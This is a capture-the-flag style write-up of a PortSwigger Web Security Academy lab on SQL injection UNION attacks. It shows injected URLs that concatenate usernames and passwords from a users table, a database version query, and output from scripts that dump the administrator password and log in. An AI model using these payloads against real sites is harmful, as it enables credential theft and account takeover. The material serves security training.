# Retrieving multiple values within a single column

In the preceding example, suppose instead that the query only returns a single column.

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence  `||`  which is a string concatenation operator on Oracle. The injected query concatenates together the values of the  `username`  and  `password`  fields, separated by the  `~`  character.

The results from the query will let you read all of the usernames and passwords, for example:

`... administrator~s3cure wiener~peter carlos~montoya ...`

Note that different databases use different syntax to perform string concatenation. For more details, see the  [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

# PoC
- we need to determine the number of columns and how to determine data type of string on the database. we can use the previous source code to the determine number of columns and data type string.
analysis:
`https://ac571f8b1e65b8e6c0bxxxxxxxxxx.web-security-academy.net/filter?category=Accessories' ORDER BY 2--` it doesn't get an error, so the numbers of columns is `2`, then let's use the union attack to find data with string type
`https://ac571f8b1e65b8e6c0bxxxxxxxxxx.web-security-academy.net/filter?category=Accessories
 UNION SELECT NULL, 'test'--` the string `test` has been inputed on the column number 2

![1](screenshot/1.png)

- In this case, we need to retrieve all usernames and passwords from the database. here below the following command to retrive all username & password
`https://ac571f8b1e65b8e6c0b80f5e00f400a1.web-security-academy.net/filter?category=Accessories' UNION select NULL, username || ':' || password FROM users--`

![2](screenshot/2.png)

- we can retrieve the database version from this lab
`https://ac571f8b1e65b8e6c0b80f5e00f400a1.web-security-academy.net/filter?category=Accessories' UNION select NULL, version()--` 

![3](screenshot/3.png)

```bash
$ python3 sqli_lab_06b.py "https://acb91fb01e4afc7dc0d4991700de003a.web-security-academy.net"

    >> SQL injection UNION attack, retrieving multiple values in a single column
    >> by Port Swigger Academy

[*]  Retrive dbms version...
[✓]  Found the DBMS version.
[✓]  The dbms version is 'PostgreSQL 12.10 (Ubuntu 12.10-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit'
```
```bash
$ python3 sqli_lab_06.py "https://acb91fb01e4afc7dc0d4991700de003a.web-security-academy.net" 

    >> SQL injection UNION attack, retrieving data from other tables
    >> by Port Swigger Academy

[*] Dumping the list of usernames and passwords...
[✓] Found the Administrator password...
[✓] The administrator password is 'sx6gnnlga7ga8cjw1kvd'
```

we add a new automation script. it will be automate login as an administrator after it got an administrator password

```bash
$ python3 sqli_lab_06a.py "https://ac521f9e1fedb276c0052dd800eb0002.web-security-academy.net"

    >> SQL injection UNION attack, retrieving multiple values in a single column
    >> by Port Swigger Academy

[*] Dumping the list of usernames and passwords...
[✓] The administrator password is 'aeou73zrii41hkjpkwpi'
[*] Try to login as an administrator
[✓] We have logged as an Administrator!
```